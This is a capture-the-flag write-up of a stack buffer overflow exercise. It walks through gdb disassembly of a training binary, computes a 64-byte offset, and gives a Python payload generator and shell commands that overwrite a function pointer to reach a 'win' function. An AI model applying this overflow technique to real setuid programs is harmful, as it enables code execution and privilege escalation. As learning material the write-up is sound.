## ex03

### Objective
The goal of this challenge is to change the code flow of the binary and see the message "code flow successfully changed".

### Steps Taken

1. **Initial Analysis**:
    - First, we used `file` to determine the type of the binary and `strings` to identify useful strings within the binary.

    ```sh
    file bin
    strings bin
    ```

    **Output of `file bin`**:
    ```
    bin: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, BuildID[sha1]=cbb07c698e33bffa1d80aa320ad36cc3a5c1b2b3, not stripped
    ```

    **Output of `strings bin`**:
    ```
    /lib/ld-linux.so.2
    __gmon_start__
    libc.so.6
    _IO_stdin_used
    gets
    puts
    printf
    __libc_start_main
    GLIBC_2.0
    PTRh
    QVh8
    [^_]
    code flow successfully changed
    calling function pointer, jumping to 0x%08x
    ```

2. **Disassembly**:
    - We used `gdb` to disassemble the binary and identify the `gets` function call, which is used to read input into a buffer, and a function pointer that is later called.

    ```sh
    gdb bin
    (gdb) break main
    (gdb) run
    (gdb) disassemble main
    ```

    **Disassembly of `main`**:
    ```assembly
    Dump of assembler code for function main:
       0x08048438 <+0>:     push   %ebp
       0x08048439 <+1>:     mov    %esp,%ebp
       0x0804843b <+3>:     and    $0xfffffff0,%esp
       0x0804843e <+6>:     sub    $0x60,%esp
       0x08048441 <+9>:     movl   $0x0,0x5c(%esp)
       0x08048449 <+17>:    lea    0x1c(%esp),%eax
       0x0804844d <+21>:    mov    %eax,(%esp)
       0x08048450 <+24>:    call   0x8048330 <gets@plt>
       0x08048455 <+29>:    cmpl   $0x0,0x5c(%esp)
       0x0804845a <+34>:    je     0x8048477 <main+63>
       0x0804845c <+36>:    mov    $0x8048560,%eax
       0x08048461 <+41>:    mov    0x5c(%esp),%edx
       0x08048465 <+45>:    mov    %edx,0x4(%esp)
       0x08048469 <+49>:    mov    %eax,(%esp)
       0x0804846c <+52>:    call   0x8048350 <printf@plt>
       0x08048471 <+57>:    mov    0x5c(%esp),%eax
       0x08048475 <+61>:    call   *%eax
       0x08048477 <+63>:    leave  
       0x08048478 <+64>:    ret    
    End of assembler dump.
    ```

    - We identified the following key points in the disassembly:
      - The `gets` function is used to read input into a buffer located at `0x1c(%esp)`.
      - A function pointer is located at `0x5c(%esp)`.
      - The function pointer is called at offset `+61`.

3. **Identify the Target Address**:
    - We identified a `win` function in the binary that prints the success message "code flow successfully changed".

    ```sh
    (gdb) info functions
    ```

    - We disassembled the `win` function to find its address.

    ```sh
    (gdb) disassemble win
    ```

    **Disassembly of `win`**:
    ```assembly
    Dump of assembler code for function win:
       0x08048424 <+0>:     push   %ebp
       0x08048425 <+1>:     mov    %esp,%ebp
       0x08048427 <+3>:     sub    $0x18,%esp
       0x0804842a <+6>:     movl   $0x8048540,(%esp)
       0x08048431 <+13>:    call   0x8048360 <puts@plt>
       0x08048436 <+18>:    leave  
       0x08048437 <+19>:    ret    
    End of assembler dump.
    ```

    - The address of the `win` function is `0x08048424`.

4. **Determine Buffer Size and Offset**:
    - The buffer starts at `0x1c(%esp)` and the function pointer is at `0x5c(%esp)`.
    - The offset is `0x5c - 0x1c = 0x40` (64 bytes).

5. **Craft the Payload**:
    - We created a Python script to generate the payload that overflows the buffer and modifies the function pointer to point to the `win` function.

    ```python
    import struct
    import base64

    buffer_size = 64  # 0x40 in hex
    target_address = 0x08048424  # Address of the win function

    payload = b'A' * buffer_size
    payload += struct.pack("<I", target_address)

    # Encode the payload in base64
    encoded_payload = base64.b64encode(payload).decode('ascii')
    print(encoded_payload)
    ```

6. **Execute the Binary with the Payload**:
    - We used the following commands to set the payload as an environment variable and run the binary.

    ```sh
    # Generate the payload and print it
    python -c 'import struct, base64; buffer_size = 64; target_address = 0x08048424; payload = b"A" * buffer_size + struct.pack("<I", target_address); encoded_payload = base64.b64encode(payload).decode("ascii"); print(encoded_payload)'

    # Set the environment variable using the copied output
    export PAYLOAD=$(echo QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSSEBAg= | base64 --decode)

    # Run the binary
    echo -e $PAYLOAD | ./bin
    ```

### Difficulties Encountered

- **Finding the Success Message Address**:
    - Initially, we had trouble identifying the exact address where the success message "code flow successfully changed" is printed.
    - We used GDB to search for the message and disassemble the `win` function to find its address.

- **Handling Non-ASCII Characters in the Payload**:
    - When crafting the payload, we encountered issues with non-ASCII characters.
    - We resolved this by encoding the payload in base64 and then decoding it in the environment variable.

### Output
- The output showed the success message, indicating that we successfully exploited the binary:
    ```
    calling function pointer, jumping to 0x08048424
    code flow successfully changed
    ```

### Tools Used
- `file`
- `strings`
- `gdb`
- Python

### Educational Purpose
These methods and tools are used strictly for educational purposes to understand and protect against similar vulnerabilities. 

### Script
Include the Python script used to generate the payload:

```python
import struct
import base64

buffer_size = 64  # 0x40 in hex
target_address = 0x08048424  # Address of the win function

payload = b'A' * buffer_size
payload += struct.pack("<I", target_address)

# Encode the payload in base64
encoded_payload = base64.b64encode(payload).decode('ascii')
print(encoded_payload)